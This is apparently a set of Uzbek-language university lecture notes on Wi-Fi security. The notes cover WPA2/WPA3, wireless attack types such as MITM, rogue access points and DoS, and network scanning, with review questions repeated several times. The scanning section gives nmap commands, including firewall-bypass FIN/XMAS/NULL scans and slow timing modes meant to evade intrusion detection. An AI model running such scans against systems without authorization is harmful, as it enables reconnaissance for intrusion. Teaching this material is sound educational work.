WPA2 (Wi-Fi Protected Access II) protokoli. WPA2 protokoli 2004-yilda IEEE tomonidan tasdiqlangan va bugungi kunda global standart bo‘lgan xavfsizlik tizimi. Ushbu protokol haqida batafsil ma’lumot 802.11i standartida to‘liq keltirilgan.
Asosiy texnik xususiyatlari:
	•	Shifrlash algoritmi: AES (Advanced Encryption Standard);
	•	Rejim: CCMP (Counter Mode CBC-MAC Protocol);
	•	Autentifikatsiya rejimlari:
	•	WPA2-Personal (PSK);
	•	WPA2-Enterprise (802.1X + EAP);
CCMPning afzalliklari:
	•	Oqim shifrlash (CTR) + yaxlitlik (CBC-MAC) birgalikda ishlaydi;
	•	kuchli kriptografik himoyani ta’minlaydi;
	•	paket yaxlitligi va autentifikatsiyasi yaxshilangan.
WPA2 zaifliklari:
	•	2017-yilda KRACK (Key Reinstallation Attack) hujumi aniqlangan;
	•	PSK parollari zaif bo‘lsa, qo‘pol kuch hujumi yordamida uni topish mumkin;
	•	Enterprise rejimida noto‘g‘ri EAP konfiguratsiyasi MITMga olib kelishi mumkin.
Wi-Fi qurilmalarining 90% dan ko‘prog‘i WPA2 protokolini qo‘llab-quvvatlaydi. Hozir ham asosiy xavfsizlik standarti sifatida ishlatilsada, WPA3 protokoli uni o‘rnini asta-sekin egallamoqda.
WPA3 (Wi-Fi Protected Access III) protokoli. WPA3 protokoli 2018-yilda Wi-Fi Alliance tomonidan ishlab chiqilgan eng yangi va eng xavfsiz Wi-Fi protokoli. U WPA2ning kamchiliklarini to‘liq bartaraf etishga qaratilgan.
Asosiy yangiliklar:
	•	SAE (Simultaneous Authentication of Equals) — bardoshli parol asosida autentifikatsiya qilinadi;
	•	Dragonfly Key Exchange — MITM va offline qo‘pol kuch hujumlariga qarshi himoya;
	•	192-bit security suite — korporativ darajada kuchli kriptografik himoyaga ega;
	•	Individualized Data Encryption — ochiq tarmoqlarda ham shifrlash amalga oshiriladi;
	•	Forward secrecy — kalit aniqlansa ham oldingi sessiyalarni ochib bo‘lmaydi.
WPA3-Personal rejimi:
	•	WPA2-PSK o‘rniga SAE ishlatiladi;
	•	Zaif parollarni qo‘pol kuch hujumida topish amalda imkonsiz.
WPA3-Enterprise rejimi:
	•	192-bit xavfsizlik to‘plami: AES-GCMP-256, HMAC-SHA384, RSA/ECDH 3072/384 protokollaridan foydalangan;
	•	bank, davlat va harbiy tizimlar uchun mo‘ljallangan.
2020-yildan boshlab yangi qurilmalar WPA3 protokolini majburiy qo‘llab-quvvatlashi talab etilmoqda. Bundan tashqari, ko‘p marshrutizatorlar WPA2/WPA3 aralash rejimini ham taklif etmoqda.
Wi-Fi simsiz tarmog‘ida mavjud xavfsizlik muammolari
Simsiz aloqa texnologiyalari bugungi kunda uy, ofis, ta’lim muassasalari, davlat va xususiy tashkilotlarning asosiy kommunikatsiya vositasiga aylangan. Wi-Fi texnologiyasining qulayligi, imkoniyati va arzonligi uni keng qo‘llanuvchan tarmoqga aylantirgan bo‘lsada, aynan radioaloqaning ochiq mohiyati tarmoq xavfsizligi uchun jiddiy xavflarni keltirib chiqaradi. Wi-Fi signali havo makonida erkin tarqaladi va uni istalgan shaxs maxsus uskuna orqali tutib olishi, tahlil qilishi yoki manipulyatsiya qilishi mumkin. Shu bois zamonaviy axborot xavfsizligi tizimlarida Wi-Fi tarmoqlarini himoyalash eng dolzarb masalalardan biridir.
Radiochastota muhitining ochiqligi. Wi-Fi texnologiyasining eng asosiy zaifligi shundaki, signalning uzatilishi radiochastotalarga asoslangan. Simli tarmoqlardan farqli ravishda, unda ma’lumotlar fizik kabel orqali emas, balki havo orqali yetkaziladi. Natijada Wi-Fi paketlari uzatilishi paytida: signalni har kim kuzata olishi, paketlarni yozib olish va tahlil qilish imkoniyati, radio to‘lqinlarga tashqi aralashuv bo‘lishi, soxta foydalanish nuqtasini (AP) yaratishi mumkin bo‘ladi. Bu omillar Wi-Fi xavfsizligini ta’minlashda maxfiylik, yaxlitlik va foydalanuvchanlik tamoyillariga bevosita tahdid tug‘diradi.
Kriptografik protokollardagi zaifliklar.  Wi-Fi xavfsizligi asosan WEP, WPA, WPA2 va WPA3 kabi shifrlash protokollariga tayangan. Bu protokollarning ayrimlari eskirgan bo‘lib, ularning kriptografik asosi bugungi kunda hujumlarga baroshsiz.
WEP protokoli RC4 shifrlash algoritmiga tayanadi. Undagi 24-bitli IV maydonining qisqaligi kalitlarning qayta takrorlanishiga sabab bo‘ladi. Bu esa paketlar ustida statistik tahlil o‘tkazish imkonini beradi. Shuningdek, ICV (CRC32) yaxlitlik mexanizmi kriptografik himoya vositasini bajara olmaydi.
WPA protokoli vaqtinchalik yechim sifatida taklif qilingan bo‘lib, TKIP mexanizmi bilan WEPdagi ayrim kamchiliklarni bartaraf etgan bo‘lsada, baribir RC4 oqim shifridan foydalanadi. Bu esa uni zamonaviy hujumlar oldida zaif qiladi.
WPA2 protokoli AES-CCMPga asoslangan bo‘lib, hozirgacha eng ishonchli himoya sifatida qaraladi. Ammo, 2017-yilda aniqlangan KRACK hujumi ushbu protokolning 4-bosqichli qo‘l siqish (handshake) jarayoni noto‘g‘ri amalga oshirilganida juda jiddiy zaifliklarni keltirib chiqarishini ko‘rsatdi.
WPA3 protokoli SAE mexanizmi bilan himoyaning yangi avlodini taklif qilgan bo‘lsada, noto‘g‘ri konfiguratsiya qilingan holatlarda Dragonblood nomli zaifliklar aniqlangan.
Zaif yoki noto‘g‘ri sozlangan qurilmalar. Ko‘plab foydalanuvchilar va hatto tashkilotlar marshrutizatorlarni standart sozlamalarda qoldiradilar. Masalan: standart parollarni o‘zgartirmaslik, WPS funksiyasini o‘chirib qo‘ymaganlik, zaif shifrlash rejimini (WEP yoki WPA-TKIP) qo‘llash, SSIDni himoyasiz tark etish, yangilanishlarni o‘z vaqtida o‘rnatmaslik kabi. Bularning barchasi Wi-Fi tarmog‘ining hujumchilarga nisbatan bardoshligini kamaytiradi.
Parol siyosatining to‘g‘ri emasligi. Wi-Fi tarmoqlari ko‘pincha parol asosida himoyalanadi. Agar parollar: qisqa, oddiy so‘zlardan iborat, shaxsiy ma’lumot bilan bog‘liq (ism, tug‘ilgan sana), tez-tez takrorlanadigan shablonlarda bo‘lsa, qo‘pol kuch yoki lug‘at asosidagi hujumlar yordamida osonlik bilan aniqlash mumkin bo‘ladi.
Foydalanuvchi qurilmalarining himoyasizligi. Mobil qurilmalar, noutbuklar yoki IoT qurilmalarining xavfsizligi ko‘pincha router xavfsizligidan ham muhim bo‘ladi. Qurilmaning operatsion tizimi yoki drayverlari yangilanmagan bo‘lsa, hujumchi qurilmaga orqa eshik (backdoor) orqali kirishi, soxta Wi-Fi tarmog‘iga avtomatik ulanishni chaqirishi, qurilma yuborayotgan tarmoq identifikatorlaridan foydalanishi mumkin bo‘ladi.
Shu sababli Wi-Fi tarmoqlarini himoyalash bo‘yicha quyidagi tavsiyalarga amal qilish zarur hisoblanadi:
	•	WPA3 yoki hech bo‘lmasa WPA2-AES shifrlash rejimidan foydalanish;
	•	WEP va WPA-TKIPni to‘liq o‘chirish;
	•	bardoshli (16+ belgili) parollardan foydalanish;
	•	Router dasturiy vositasini muntazam yangilab borish;
	•	WPS funksiyasini o‘chirib qo‘yish;
	•	Tarmoq monitoringi va IDS/WIPS tizimlaridan foydalanish;
	•	ochiq Wi-Fi tarmoqlaridan albatta VPN mexanizmlari orqali foydalanish.
	•	SSIDni yashirish o‘rniga — kuchli shifrlash protokollariga tayangan holda himoyalash.
	Simsiz tarmoq nima va u simli tarmoqlardan qaysi jihatlari bilan farq qiladi?
	•	WLAN, WPAN, WMAN va WWAN tarmoqlarining asosiy xususiyatlari nimalardan iborat?
	•	Wi-Fi texnologiyasi qanday ishlaydi va uning asosiy komponentlari nimalar?
	•	Access Point (AP) simsiz tarmoqda qanday vazifani bajaradi?
	•	Simsiz aloqada radiochastotadan foydalanish qanday ustunliklar va cheklovlarga ega?
	•	WEP protokolining asosiy kamchiliklari nimada va nega u endi tavsiya etilmaydi?
	•	WPA protokoli WEPdagi qaysi zaifliklarni bartaraf etadi?
	•	Wi-Fi xavfsizligini oshirish uchun WPA3 qanday yangi funksiyalarni taklif qiladi?
	•	Wi-Fi tarmoqlarida uchraydigan asosiy xavflar nimalardan iborat?
	•	 Man-in-the-Middle (MITM) hujumi Wi-Fi tarmog‘ida qanday amalga oshiriladi?
Nazorat savollari
	•	Simsiz tarmoq nima va u simli tarmoqlardan qaysi jihatlari bilan farq qiladi?
	•	WLAN, WPAN, WMAN va WWAN tarmoqlarining asosiy xususiyatlari nimalardan iborat?
	•	Wi-Fi texnologiyasi qanday ishlaydi va uning asosiy komponentlari nimalar?
	•	Access Point (AP) simsiz tarmoqda qanday vazifani bajaradi?
	•	Simsiz aloqada radiochastotadan foydalanish qanday ustunliklar va cheklovlarga ega?
	•	WEP protokolining asosiy kamchiliklari nimada va nega u endi tavsiya etilmaydi?
	•	WPA protokoli WEPdagi qaysi zaifliklarni bartaraf etadi?
	•	Wi-Fi xavfsizligini oshirish uchun WPA3 qanday yangi funksiyalarni taklif qiladi?
	•	Wi-Fi tarmoqlarida uchraydigan asosiy xavflar nimalardan iborat?
	•	 Man-in-the-Middle (MITM) hujumi Wi-Fi tarmog‘ida qanday amalga oshiriladi?
Nazorat savollari
6.2. Simsiz tarmoqlarga qaratilgan hujumlar  (Ma’ruza mashg‘uloti)
1. Simsiz tarmoqlarga qaratilgan hujumlar: 
 a. Spoofing;
 b. Nazoratlanmaydigan hudud;
 c. Ruxsatsiz suqilib kirish;
 d. DoS/DDoS;
 e. O‘rtaga turgan odam hujumi.
Reja:
1. Simsiz tarmoqlarga qaratilgan hujumlar: 
 a. Spoofing;
 b. Nazoratlanmaydigan hudud;
 c. Ruxsatsiz suqilib kirish;
 d. DoS/DDoS;
 e. O‘rtaga turgan odam hujumi.
Reja:

Spoofing, nazoratlanmaydigan hudud, ruxsatsiz suqilib kirish, DoS/DDoS, o‘rtaga turgan odam hujumi.
Kalit so‘zlar:
Spoofing, nazoratlanmaydigan hudud, ruxsatsiz suqilib kirish, DoS/DDoS, o‘rtaga turgan odam hujumi.
Kalit so‘zlar:
Simsiz tarmoqlarga qaratilgan hujumlar 
Simsiz texnologiyadan foydalanilib juda katta afzalliklarga erishish mumkin. Bu texnologiya foydalanuvchilarga aloqani yо‘qotmasdan bemalol harakatlanish imkoniyatini bersa, tarmoq yaratuvchilariga bog‘lanishlarni tashkil etish uchun katta imkoniyatlarni yaratadi. Ammo, simsiz texnologiyalarda oddiy simli tarmoqlarga qaraganda kо‘proq tahdidlar mavjud bо‘ladi. Xavfsiz simsiz ilovani yaratish uchun simsiz “hujumlar” о‘tuvchi bо‘lishi mumkin bо‘lgan barcha yо‘nalishlarni aniqlash lozim.
Nazoratlanmaydigan hudud. Simli va simsiz tarmoqlar orasidagi asosiy farq tarmoq chetki nuqtalari orasidagi mutlaqo nazoratlanmaydigan zona bilan bog‘liq. Uyali tarmoqlarning yetarlicha keng makonida simsiz muhit aslo nazoratlanmaydi. Zamonaviy simsiz texnologiyalar tarmoq makonini boshqarish vositalarining chegaralangan tо‘plamini taqdim etadi. Bu simsiz tuzilmalarning yaqinidagi hujum qiluvchilarga simli dunyoda mumkin bо‘lmagan hujumlarni amalga oshirishga imkon beradi.
Yashirincha eshitish. Simsiz tarmoqlar kabi ochiq va boshqarilmaydigan muhitda eng tarqalgan muammo – anonim hujumlarning mumkinligi. Anonim hujumlarda hujumchi 6.1-rasmda kо‘rsatilganidek radiosignallarni ushlab qolib, uzatiluvchi ma’lumotlarni deshifrlashi mumkin.
Uzatishni ushlab qolish uchun niyati buzuq odam uzatgich (peredatchik) oldida bо‘lishi lozim. Ushlab qolishning bunday turlarini umuman qaydlash mumkin emas va ularga halaqit berish undan ham qiyin. Antennalar va kuchaytirgichlardan foydalanish, ushlab qolish jarayonida niyati buzuq odamlarga nishondan aytarlicha uzoq masofada bо‘lishlariga imkon beradi.
Yashirincha eshitishning yana bir usuli – simsiz tarmoqqa ulanish. Lokal simsiz tarmoqda yashirincha faol eshitish odatda Adress Resolution Protocol (ARP) protokolidan notо‘gri foydalanishga asoslangan.  Boshida  bu texnologiya tarmoqni “eshitish” maqsadida yaratilgan edi. Aslida, biz ma’lumotlar boshlanishi sathida “Man in the middle” (MITM – “о‘rtaga turgan odam”) xilidagi hujum bilan ish kо‘ramiz. Hujum qiluvchi lokal simsiz tarmoqning nishon stansiyasiga sо‘ralmagan ARP-javoblarni yuboradi, nishon stansiyasi esa hujum qiluvchiga о‘zidan о‘tayotgan barcha trafikni jо‘natadi. Sо‘ngra niyati buzuq odam paketlarni kо‘rsatilgan adresatlarga yо‘llaydi. Shunday qilib, simsiz stansiya boshqa simsiz mijozning (yoki lokal tarmoqdagi simli mijozning) trafigini ushlab qolishi mumkin.

6.1-rasm. Simsiz aloqa tizimlarida yashirincha eshitish
Xizmat kо‘rsatishdan voz kechish. DoS (Denial of Service – xizmat kо‘rsatishdan voz kechish) xilidagi hujum tarmoqni butunlay ishdan chiqarishi mumkin. Butun tarmoqda, jumladan bazaviy stansiyalarda va mijoz terminallarida, shunday kuchli interferensiya paydo bо‘ladiki, stansiyalar bir-birlari bilan bog‘lana olmaydilar (6.2-rasm). Bu hujum ma’lum doiradagi barcha kommunikatsiyani о‘chiradi. Simsiz tarmoqqa bо‘ladigan DoS hujumni oldini olish yoki to‘xtatish qiyin. Simsiz tarmoq texnologiyalarining aksariyati litsenziyalanmagan chastotalardan foydalanadi, demak, bir qancha elektron qurilmalardan interferensiya bо‘lishi mumkin.

6.2-rasm. Simsiz aloqalarda bо‘g‘ish hujumlari
MITM (Man in the middle) hujumi. MITM hujumi yuqorida tavsiflangan bostirib kirishlarga о‘xshash. Ular turli shakllarni olishlari mumkin va aloqa seansining konfidensialligini va yaxlitligini buzish uchun ishlatiladi. MITM hujumlar anchagina murakkab, chunki ularni amalga oshirish uchun tarmoq xususida batafsil axborot talab etiladi. Niyati buzuq odam, odatda, tarmoq resurslaridan birining identifikatsiyasini bajaradi. Hujum qurboni ulanishni boshlaganida, firibgar uni ushlab qoladi va istalgan resurs bilan ulanishni tugallaydi, sо‘ngra ushbu resurs bilan barcha ulanishlarni о‘zining stansiyasi orqali о‘tkazadi (6.3-rasm). Bunda hujum qiluvchi axborotni jо‘natishi, jо‘natilganini о‘zgartirishi yoki barcha muzokaralarni yashirincha eshitishi va sо‘ngra deshifrlashi mumkin.

6.3-rasm. MITM xilidagi ataka
Tarmoqdan  foydalanishning  yolg‘on  nuqtalari (spoofing).   Tajribali  hujum qiluvchi   tarmoq  resurslarini   imitatsiya   qilish   bilan   foydalanishning yolg‘on nuqtalarini tashkil etishi mumkin. Abonentlar, hech shubhalanmasdan foydalanishning ushbu yolg‘on nuqtasiga murojaat etadilar va uni о‘zining muhim rekvizitlaridan, masalan, autentifikatsiya axborotidan xabardor qiladilar. Hujumning bu xili tarmoqdan foydalanishning haqiqiy nuqtasini “bо‘g‘ish” maqsadida ba’zida tо‘g‘ridan-tо‘g‘ri bо‘g‘ish bilan birgalikda amalga oshiriladi (6.4-rasm).
Simli tarmoqdan foydalanuvchilar ham, bilmasdan tarmoqni hujumga ochib berib foydalanishning yolg‘on nuqtalarining о‘rnatilishiga sababchi bо‘lishlari mumkin. Ba’zida foydalanuvchi, qulaylikka intilib, simsiz aloqa taqdim etuvchi foydalanishning simsiz nuqtalarini о‘rnatsada, xavfsizlik muammosini о‘ylamaydi. Bu nuqtalar turli hujumlarga duchor bо‘ladigan konfiguratsiyada о‘rnatilgani bois, simli tarmoqqa kirish uchun “orqa eshik” vazifasini bajarishi mumkin.

6.4-rasm. Foydalanishning yolg‘on nuqtasi
Simli tarmoqdan foydalanuvchilar ham, bilmasdan tarmoqni hujumga ochib berib foydalanishning yolg‘on nuqtalarining о‘rnatilishiga sababchi bо‘lishlari mumkin. Ba’zida foydalanuvchi, qulaylikka intilib, simsiz aloqa taqdim etuvchi foydalanishning simsiz nuqtalarini о‘rnatib, xavfsizlik muammosini о‘ylamaydi.
Hujumlarning anonimligi. Simsiz foydalanish hujumning tо‘liq anonimligini ta’minlaydi. О‘rnatilgan joyni aniqlovchi mos tarmoq asbob-uskunasi bо‘lmasa, hujum qiluvchi anonimlikni osongina saqlashi va simsiz tarmoq ta’siri hududidagi har qanday joyda berkinishi mumkin. Bunday holda niyati buzuq odamni tutish qiyin, ishni sudga oshirish esa undan ham qiyin.
Ta’kidlash lozimki, aksariyat firibgarlar tarmoqni, ularning ichki resurslariga hujum qilish uchun emas, balki Internetni tekin anonim foydalanish uchun о‘rganadilar va Internet orqali boshqa tarmoqlarga hujum qiladilar.
“Mijoz-mijoz” xilidagi hujumlar. Tarmoqning barcha abonentlari hujum qilinishi mumkin. Birinchi muvaffaqiyatdan sо‘ng hujum qiluvchi korporativ yoki telekommunikatsion tarmoqdan foydalanish huquqiga ega bо‘ladi. Aksariyat tarmoq ma’murlari xavfsizlik rejimiga talabni oshirishga yoki shaxsiy tarmoqlararo ekranlarni о‘rnatishga yetarlicha e’tibor bermaydilar. Shu sababli, simsiz tarmoq mijozlariga muvaffaqiyatli hujumlar niyati buzuq odamlarga foydalanuvchilarning ismini va parolini ochish, boshqa tarmoq resurslaridan foydalanish imkonini berishi mumkin.
Tarmoq asbob-uskunalariga hujumlar. Notо‘g‘ri konfiguratsiyalangan asbob-uskunalar hujum qiluvchilar uchun birinchi “xо‘rak” hisoblanadi va tarmoqqa keyingi suqilib kirishga yо‘l ochadi. Hujumlarning asosiy obyektlari – marshrutizatorlar, uzib-ulagichlar, arxivlarni saqlovchi serverlar va foydalanish serverlari.
	Simsiz tarmoqlarda nazoratlanmaydigan hudud deyilganda nima tushuniladi?
	•	Yashirincha eshitish nima?
	•	Simsiz tarmoqlarda xizmat ko‘rsatishda voz kechish hujumini tushuntiring?
	•	MITM hujumi va uning maqsadini tushuntiring?
	•	Tarmoqdan foydalanish uchun yolg‘on nuqtani kiritishga asoslangan hujumni tushuntiring?
	•	Mijoz-mijoz turidagi hujumni tushuntiring?
	•	Tarmoq qurilmalariga qaratilgan hujumlarni tushuntiring?
Nazorat savollari
	•	Simsiz tarmoqlarda nazoratlanmaydigan hudud deyilganda nima tushuniladi?
	•	Yashirincha eshitish nima?
	•	Simsiz tarmoqlarda xizmat ko‘rsatishda voz kechish hujumini tushuntiring?
	•	MITM hujumi va uning maqsadini tushuntiring?
	•	Tarmoqdan foydalanish uchun yolg‘on nuqtani kiritishga asoslangan hujumni tushuntiring?
	•	Mijoz-mijoz turidagi hujumni tushuntiring?
	•	Tarmoq qurilmalariga qaratilgan hujumlarni tushuntiring?
Nazorat savollari
6.3. Tarmoqni skanerlash usullari  (Ma’ruza mashg‘uloti)
1. Tarmoqni skanerlash usullari.
2. Ping yuborish orqali aniqlash. 
3. Portlarni skanerlash.
4. Nmap vositasi.
Reja:
1. Tarmoqni skanerlash usullari.
2. Ping yuborish orqali aniqlash. 
3. Portlarni skanerlash.
4. Nmap vositasi.
Reja:

Tarmoqni skanerlash (Network Scanning), Ping bilan hostni aniqlash (Ping Sweep), TCP SYN skanerlash (TCP SYN Scan), UDP skanerlash (UDP Scanning), Xizmat versiyasini aniqlash (Service Detection), Operatsion tizimni aniqlash (OS Detection), Vaqt sozlamalari: T0–T5 (Nmap Timing Options).
Kalit so‘zlar:
Tarmoqni skanerlash (Network Scanning), Ping bilan hostni aniqlash (Ping Sweep), TCP SYN skanerlash (TCP SYN Scan), UDP skanerlash (UDP Scanning), Xizmat versiyasini aniqlash (Service Detection), Operatsion tizimni aniqlash (OS Detection), Vaqt sozlamalari: T0–T5 (Nmap Timing Options).
Kalit so‘zlar:
Tarmoqni skanerlash usullari
Tarmoqni skanerlash (Network Scanning) – bu ma’lum bir tarmoqdagi hostlarni aniqlash, portlarning holatini tekshirish, xizmatlarni aniqlash va xavfsizlik zaifliklarini baholash jarayonidir. Etik xakerlar, tizim administratorlari va xavfsizlik mutaxassislari ushbu texnikalardan tarmoq infratuzilmasining holatini bilish, noto‘g‘ri konfiguratsiyalarni aniqlash va zaif joylarni tuzatish uchun foydalanadilar.
Tarmoqni skanerlash odatda uch bosqichdan iborat:
1. Host Discovery (Hostlarni aniqlash): tarmoqda qaysi qurilmalar faol ekanligi aniqlanadi, bunda ICMP Echo (Ping), ARP so‘rovlari (LAN tarmoqlarida), TCP SYN ping, UDP ping so‘rovlaridan foydalanish mumkin.
2. Port Scanning (Portlarni skanerlash): aniqlangan qurilmadagi portlarning ochiq, yopiq yoki filtrlanganligi aniqlanadi. Bunda TCP va UDP portlar holatlar o‘rganiladi.
3. Service & Version Detection (xizmatlarni aniqlash): aniqlangan ochiq portlarda qaysi dastur yoki xizmat ishlayotgani aniqlanadi (masalan, Apache, OpenSSH, MySQL). 
Bu bosqichlar tarmoq holati haqida to‘liq tasavvur beradi.
Ping yuborish (Ping Sweeps) orqali aniqlash
Ping sweep – bir tarmoq prefiksiga (masalan: 192.168.1.0/24) ko‘p miqdordagi ICMP Echo so‘rovlarini yuborish orqali faol hostlarni topish texnikasidir (6.5-rasm).
Unga ko‘ra skanerlovchi qurilma tarmoqdagi barcha IP-manzillarga ICMP Echo Request yuboradi. Javob qaytargan qurilmalar faol deb belgilanadi. Javob qaytarmaganlar offline yoki xavfsizlik devori orqali bloklangan bo‘lishi mumkin.

6.5-rasm. ICMP Echo so‘rovlarini yuborish
Ushbu usulning afzalliklari: tez ishlashi, tarmoqdagi faol qurilmalarni aniqlashning eng oddiy usuli ekanligi bilan xarakterlanadi.
Kamchiliklari sifatida esa ICMP ko‘pincha xavfsizlik mexanizmlari (firewall) orqali bloklanadi yoki baʼzi tizimlarni ICMPga javob qaytarmasligini ko‘rsatish mumkin.
Linux OT da ping yuborish uchun foydalanilgan buyruq:
fping -a 192.168.1.0/24
Nmap bilan ping yuborish:
nmap -sn 192.168.1.0/24, -sn – portlarni skanerlashni o‘chiradi, faqat hostni aniqlashni (host discovery) bajaradi.
Portlarni skanerlash
Portni skanerlash – qurilmadagi ochiq (open), yopiq (closed) yoki filtrlangan (filtered) portlarni tekshirish jarayonidir.
1. TCP Port Scanning turlari
a) TCP SYN Scan (Half-open scan): eng ko‘p ishlatiladigan, tez va yashirin usul (6.6-rasm).
Bunda:
	•	Skanerlovchi SYN yuboradi.
	•	Agar server SYN/ACK yuborsa → port OPEN.
	•	Agar RST yuborsa → port CLOSED.

6.6-rasm. SYN/ACK so‘rovlarini yuborish
Nmap vositasi yordamida:
nmap -sS 192.168.1.10
b) TCP Connect Scan: to‘liq TCP uch bosqichli qo‘l siqishish (three-way handshake) bajaradi.
Nmap vositasi yordamida:
nmap -sT 192.168.1.10
c) TCP FIN, XMAS, NULL Scan (Firewall bypass scanning): ba’zi xavfsizlik mexanizmlari SYN paketlarni filtrlashi mumkin, FIN/XMAS/NULL paketlar esa eʼtiborsiz qoldiriladi.
	•	FIN scan: Faqat FIN flag yuboradi;
	•	XMAS scan: FIN+PSH+URG flaglar;
	•	NULL scan: hech qanday flag yo‘q.
Nmap vositasida amalga oshirish:
nmap -sF 192.168.1.10
nmap -sX 192.168.1.10
nmap -sN 192.168.1.10
2. UDP Port Scanning
UDP bilan ishlaganda portning faol yoki faol emasligini aniqlash ancha qiyin. UDP portlarida skaner SYN/ACK paketlariga tayana olmaydi. Aslida, skaner deyarli har doim tinglayotgan xizmatni qandaydir javob qaytarishga majbur qilishga tayanadi.
Juda ko‘p portlar potensial ravishda ochiq bo‘lishi va turli xizmatlar faqat to‘g‘ri turdagi ma’lumotga javob berishi sababli, barcha portlarni oqilona vaqt ichida skanerlash murakkab va vaqt talab qiluvchi jarayonga aylanadi.
Quyidagi muloqotni ko‘rib chiqib, unda Eva UDP porti ochiq yoki yo‘qligini aniqlashga harakat qiliyotganini ko‘rish mumkin (6.7-rasm).
Eva to‘g‘ri protokolda “gapirishi” va paketlar manzilga yetib borishiga, masalan, paketlar yo‘qolmasligiga ishonch hosil qilishi kerak. Aks holda, Eva portning ochiq ekanligini aniqlay olmasligi mumkin.

6.7-rasm. UDP Port Scanning
Shu sababli, agar barcha portlarni skanerlash kerak bo‘lsa, UDP skanerlash juda ko‘p vaqt talab qilishi mumkin.
Nmap vositasida amalga oshirish:
nmap -sU 192.168.1.10
Nmap vositasi
Nmap (“Network Mapper”) – bu tarmoqni aniqlash va xavfsizlik auditlari uchun mo‘ljallangan bepul va ochiq manbali vosita. Ko‘plab tizim va tarmoq administratorlari ham undan tarmoq inventarizatsiyasi, xizmatlarni yangilash jadvalini boshqarish va host yoki xizmatning ishlash vaqtini (uptime) kuzatish kabi vazifalarni bajarish uchun foydalanadilar.
Nmap tarmoqda qaysi hostlar mavjudligini, ular qanday xizmatlar (ilova nomi va versiyasi) taklif qilayotganini, qaysi operatsion tizimlar (va ularning versiyalari) ishlayotganini, qanday paket filtrlari yoki xavfsizlik mexanizmlari qo‘llanilayotganini va yana o‘nlab boshqa xususiyatlarni aniqlash uchun IP-paketlardan o‘ziga xos tarzda foydalanadi.
U katta tarmoqlarni tezlik bilan skanerlash uchun yaratilgan bo‘lsada, bitta hostni tahlil qilishda ham juda yaxshi ishlaydi. Nmap barcha asosiy kompyuter operatsion tizimlarida ishlaydi va Linux, Windows hamda Mac OS X uchun rasmiy paketlarga ega.
Klassik buyruq-qatorli Nmap dasturidan tashqari, Nmap to‘plamiga quyidagilar ham kiradi:
Zenmap – ilg‘or grafik interfeys va natijalarni ko‘rish vositasi;
Ncat – moslashuvchan ma’lumot uzatish, yo‘naltirish va nosozliklarni tuzatish vositasi;
Ndiff – skan natijalarini solishtirish ilovasi;
Nping – paketlar generatsiyasi va javoblarni tahlil qilish vositasi.
Nmap dasturi yordamida skanerlashga oid amaliy tavsiyalar
Nmapga eng ko‘p ishlatiladigan portlarni skanerlashni buyurish mumkin. Buning uchun –top-ports argumentidan foydalaniladi:
nmap –top-ports 100 <target>
Skanerlovchi port ortida tinglayotgan ilovaning versiyasini aniqlashga harakat qilishi mumkin. Bu xizmat skanerlash (service scanning) deb ataladi va -sV flagi (bayroq) bilan yoqiladi:
nmap -sV <target>
Nmapda ma’lum bir xizmatni nishonga olib, u bilan o‘zaro ishlash uchun mo‘ljallangan ko‘plab ichki skriptlar mavjud. Skriptlar xizmatdan ma’lumot olish yoki uni ekspluatatsiya qilishga harakat qilish kabi turli vazifalarni bajarishi mumkin. Faqat xavfsiz tekshiruvlarni bajaruvchi skanerlashni -sC flag bilan yoqish lozim. Bu hech qanday xizmatni ishdan chiqarish yoki ekspluatatsiya qilish urinishlarini o‘z ichiga olmaydi:
nmap -sC <target>
Operatsion tizimni aniqlash ham skaner tomonidan amalga oshirilishi mumkin. Bu funksional imkoniyat nishon (target) qurilmada qaysi operatsion tizim ishlayotganini taxmin qilishga harakat qiladi. Buning uchun turli parametrlar tahlil qilinadi. Ushbu imkoniyat -O argumenti bilan yoqiladi:
nmap -O <target>
Nmapning agressiv rejimi bir vaqtning o‘zida ko‘plab flaglarni yoqadi. Bu rejimda skaner versiya va OS aniqlashni amalga oshiradi va eng mashhur 1000 ta portni skanerlaydi. U -A flagi bilan yoqiladi:
nmap -A <target>
Nmap yuqoridagi barcha flaglar bilan IPv6 manzillarini ham skanerlashi mumkin. IPv6 rejimini yoqish uchun -6 flagi qo‘shiladi:
nmap -6 <target>
Nmap vaqt sozlamalari (Timing options)
Skanerlash turli tezliklarda amalga oshirilishi mumkin. Sekin skanerlash IDS (Intrusion Detection System) tizimlari tomonidan aniqlanish ehtimolini kamaytiradi, tez skan esa tizimni haddan tashqari yuklashi mumkin. Nmap quyidagi vaqt variantlarini qo‘llab-quvvatlaydi:
T0 – Paranoid (Juda ehtiyotkor). Bu variant aniqlanishni istamaydigan hujumchilar uchun mo‘ljallangan. IDS tizimlari ma’lum vaqt oralig‘ida ko‘p so‘rovlarni bog‘lay oladi. Paranoid rejimi har soniyada juda kam paket yuborish orqali bundan chetlashishga harakat qiladi.
T1 – Sneaky (Yashirin). T0 dan tezroq, ammo baribir IDS tizimlarini chetlab o‘tish uchun mo‘ljallangan.
T2 – Polite (Bilinmas). Skanerlash sekin amalga oshiriladi va tizimga zarar yetkazmaslik yoki uni ishdan chiqarmaslik uchun maksimal ehtiyotkorlik bilan ishlaydi.
T3 – Normal (Oddiy). Bu – Nmapning standart skanerlash tezligi.
T4 – Aggressive (Agressiv). Tezkor natija beradi va ko‘pchilik tizimlar bu tezlikni ko‘tara oladi.
T5 – Insane (Juda tez / Haddan tashqari agressiv). To‘liq quvvatda va maksimal tezlikda paketlar yuboriladi.
	Network scanning nima va u qaysi bosqichlardan iborat?
	•	Ping sweep qanday ishlaydi va ICMP paketlari nima uchun ba’zan javob qaytarmaydi?
	•	TCP SYN Scan bilan TCP Connect Scan o‘rtasidagi asosiy farqlar nimalardan iborat?
	•	Nima uchun UDP skanerlash TCP skanerlashga nisbatan murakkab va ko‘proq vaqt talab qiladi?
	•	Nmapda xizmat va versiyani aniqlash qanday bayroq (flag) orqali yoqiladi va uning vazifasi nima?
	•	Nmapning agressiv rejimi (-A) qaysi funksiyalarni bir vaqtning o‘zida ishga tushiradi?
	•	Nmap timing rejimlari (T0–T5) o‘rtasidagi asosiy farqlar nimada va ular qaysi holatlarda qo‘llaniladi?
Nazorat savollari
	•	Network scanning nima va u qaysi bosqichlardan iborat?
	•	Ping sweep qanday ishlaydi va ICMP paketlari nima uchun ba’zan javob qaytarmaydi?
	•	TCP SYN Scan bilan TCP Connect Scan o‘rtasidagi asosiy farqlar nimalardan iborat?
	•	Nima uchun UDP skanerlash TCP skanerlashga nisbatan murakkab va ko‘proq vaqt talab qiladi?
	•	Nmapda xizmat va versiyani aniqlash qanday bayroq (flag) orqali yoqiladi va uning vazifasi nima?
